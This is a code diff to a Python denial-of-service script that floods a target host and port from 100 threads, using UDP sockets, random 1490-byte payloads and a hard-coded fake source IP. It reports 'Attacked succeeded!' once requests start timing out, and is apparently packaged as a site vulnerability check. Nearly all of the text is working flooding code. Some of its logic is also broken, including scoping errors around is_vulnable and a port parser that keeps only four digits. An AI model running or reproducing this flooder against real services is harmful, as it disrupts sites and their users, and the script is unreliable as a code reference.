@@ -1,15 +1,20 @@
-import socket, threading, time
+import socket, threading, time, random
 
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-# TODO
-host = "localhost"
-port = 3000
 fake_ip = '182.21.20.32'
 default_port = 80
 
 attack_num = 0
 failed_requests = 0
+
+is_vulnable = False
+message = ""
+
+testDone = False
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
 
 def sendRequest():
     try:
@@ -39,6 +44,13 @@ def checkFailedRequests():
         print("Connection failed")
         time.sleep(1)
         print("Attacked succeeded!")
+        global message
+        message = "Attacked succeeded!"
+        global is_vulnable
+        is_vulnable = True
+        testDone = True
+        # return is_vulnable, message
+
 
 
 def attack():
@@ -47,7 +59,7 @@ def attack():
             sendRequest()
             global attack_num
             attack_num += 1
-            print("Attacks: " + str(attack_num)) 
+            # print("Attacks: " + str(attack_num)) 
         except BrokenPipeError:
             print("BrokenPipeError")    
         except TimeoutError:
@@ -55,16 +67,19 @@ def attack():
             failed_requests += 1
             break
 
-def dosAtack(target, target_port):
+def execute_attack(target, target_port):
+    global message
+    message = "The web is working ok"
     global host 
     host = target
     global port 
     port = target_port if target_port is not None else default_port
-    print("DOS attack host:" + host + ", port:" + str(port))
+    print("DOS attack host: " + host + ", port: " + str(port))
     
     if sendRequest() == False:
         print("The web page is probably not working")
-        quit()
+        message = "The web page is probably not working"
+        return is_vulnable, message
 
     for i in range(100):
         try:
@@ -73,10 +88,28 @@ def dosAtack(target, target_port):
         except BrokenPipeError:
             print(str(i) + " thread broken")
 
-    checkThread = threading.Thread(target=checkFailedRequests)
-    checkThread.start()
+    # checkThread = threading.Thread(target=checkFailedRequests)
+    # checkThread.start()
 
-    # TODO - return an answear
+    while True:
+        time.sleep(1)
+        global failed_requests
+        if failed_requests > 10:
+            print(str(failed_requests) + " requested failed")
+            break
 
-dosAtack("localhost", 3000)
+    try:
+        # print("Let's try again if page works...")
+        sendRequest()
+    except TimeoutError:
+        print("Attacked succeeded!")
+        message = "Attacked succeeded!"
+        is_vulnable = True
+        return is_vulnable, message
+
+def dos_attack(url):
+    port = int(url.split(":")[2][0:4])
+    address = url.split(":")[1][2:]
+    return execute_attack(address, port)
+    
 
